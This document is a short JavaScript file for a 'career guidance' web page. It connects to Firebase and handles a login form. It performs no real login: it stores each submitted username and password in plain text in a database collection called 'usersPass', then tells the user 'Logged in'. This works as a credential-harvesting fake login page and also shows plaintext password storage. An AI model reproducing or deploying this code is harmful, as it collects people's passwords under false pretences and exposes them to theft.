import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyAM1qP86CutNuvR1FiGdDpEtYptKV9S0tk",
  authDomain: "career-guidancee.firebaseapp.com",
  projectId: "career-guidancee",
  storageBucket: "career-guidancee.firebasestorage.app",
  messagingSenderId: "323488394071",
  appId: "1:323488394071:web:b69d84d7fa8d65cd44ac12",
  measurementId: "G-DHZ075SLSP"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  await addDoc(collection(db, "usersPass"), {
    username,
    password,
    createdAt: serverTimestamp()
  });

  document.getElementById("msg").innerText = "Logged in";
  e.target.reset();
});
